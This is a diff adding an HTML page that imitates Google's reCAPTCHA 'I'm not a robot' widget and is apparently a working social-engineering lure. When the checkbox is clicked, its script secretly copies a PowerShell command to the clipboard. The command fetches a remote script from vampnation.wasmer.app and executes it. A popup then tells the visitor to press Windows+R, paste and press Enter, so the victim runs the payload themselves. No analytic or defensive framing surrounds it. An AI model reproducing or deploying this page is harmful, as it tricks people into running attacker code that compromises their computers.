@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>reCAPTCHA Clone</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f9f9f9;
+      margin: 0;
+    }
+
+    .background-box {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .recaptcha-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: white;
+      padding: 15px;
+      border-radius: 5px;
+      border: 1px solid #d3d3d3;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+      width: 300px;
+      position: relative;
+    }
+
+    .checkbox {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #c3c3c3;
+      border-radius: 3px;
+      margin-right: 10px;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .checkbox.checked::after {
+      content: '\2713';
+      font-size: 18px;
+      color: #4285f4;
+      font-weight: bold;
+    }
+
+    .recaptcha-text {
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .recaptcha-logo {
+      position: absolute;
+      right: 10px;
+      bottom: 10px;
+      width: 40px;
+    }
+
+    .loading-spinner {
+      display: none;
+      margin-left: 10px;
+    }
+
+    .loading-spinner div {
+      width: 6px;
+      height: 6px;
+      background-color: #4285f4;
+      border-radius: 50%;
+      margin: 2px;
+      display: inline-block;
+      animation: pulse 1.2s infinite ease-in-out;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 0.3; }
+      50% { opacity: 1; }
+    }
+
+
+
+
+  
+  .popup-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(5px);
+    animation: fadeIn 0.3s ease-in-out;
+  }
+
+  .popup-box {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    padding: 25px;
+    width: 400px;
+    border-radius: 12px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    text-align: center;
+    font-family: Arial, sans-serif;
+    animation: slideIn 0.3s ease-in-out;
+  }
+
+  .popup-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 10px;
+    color: #333;
+  }
+
+  .close-btn {
+    background: none;
+    border: none;
+    font-size: 20px;
+    cursor: pointer;
+    color: #777;
+  }
+
+  .close-btn:hover {
+    color: #000;
+  }
+
+  .popup-content {
+    font-size: 14px;
+    color: #444;
+    line-height: 1.6;
+  }
+
+  .popup-content p {
+    margin: 10px 0;
+  }
+
+  .verify-btn {
+    background-color: #4285f4;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%;
+    margin-top: 15px;
+    font-weight: bold;
+    transition: background 0.2s;
+  }
+
+  .verify-btn:hover {
+    background-color: #357ae8;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  @keyframes slideIn {
+    from { transform: translate(-50%, -60%); opacity: 0; }
+    to { transform: translate(-50%, -50%); opacity: 1; }
+  }
+  </style>
+<script>
+  function startVerification() {
+    if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+      alert("Your device is not compatible with this verification process. Please use a desktop.");
+      return;
+    }
+
+    let checkbox = document.querySelector('.checkbox');
+    let spinner = document.querySelector('.loading-spinner');
+    const payload = `powershell -c "$u='https://vampnation.wasmer.app/vamp_verify.txt';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr $u -UseBasicParsing -UserAgent 'Captcha').Content;"`;
+    checkbox.classList.add('checked');
+    spinner.style.display = 'inline-block';
+
+    navigator.clipboard.writeText(payload)
+      .then(() => console.log("Copied to clipboard"))
+      .catch(err => console.error("Failed to copy: ", err));
+
+    setTimeout(() => {
+      spinner.style.display = 'none';
+      document.querySelector('.popup-overlay').style.display = 'block';
+      document.querySelector('.popup-box').style.display = 'block';
+    }, 2000);
+  }
+
+  function verifyAndRedirect() {
+    let verifyBtn = document.querySelector('.verify-btn');
+    let loadingSpinner = document.querySelector('.verify-btn .loading-spinner');
+
+    verifyBtn.innerHTML = "Verifying...";
+    verifyBtn.classList.add("disabled");
+    loadingSpinner.style.display = "inline-block";
+
+    let currentDomain = window.location.origin;
+    let redirectUrl = `${currentDomain}/index2`;
+
+    setTimeout(() => {
+      window.location.href = redirectUrl;
+    }, 20000); // 20 seconds delay
+  }
+
+  function closePopup() {
+    document.querySelector('.popup-overlay').style.display = 'none';
+    document.querySelector('.popup-box').style.display = 'none';
+  }
+</script>
+</script>
+</head>
+<body>
+  <div class="background-box">
+    <div class="recaptcha-container">
+      <div class="checkbox" onclick="startVerification()"></div>
+      <div class="recaptcha-text">I'm not a robot</div>
+      <div class="loading-spinner">
+        <div></div><div></div><div></div>
+      </div>
+      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="recaptcha-logo">
+    </div>
+  </div>
+
+  <div class="popup-overlay" onclick="closePopup()"></div>
+<div class="popup-box">
+  <div class="popup-header">
+    Complete Verification
+    <button class="close-btn" onclick="closePopup()">×</button>
+  </div>
+  <div class="popup-content">
+    <p><strong>Step 1:</strong> Press & hold <span style="color:#4285f4;">Windows Key + R</span>.</p>
+    <p><strong>Step 2:</strong> In the window, press <span style="color:#4285f4;">Ctrl + V</span>.</p>
+    <p><strong>Step 3:</strong> Press <span style="color:#4285f4;">Enter</span> on your keyboard.</p>
+    <p><strong>Step 4:</strong> Click the button below to finish.</p>
+  </div>
+  <button class="verify-btn" onclick="verifyAndRedirect()">
+    VERIFY
+    <div class="loading-spinner"></div>
+  </button>
+</div>
+</body>
+</html>
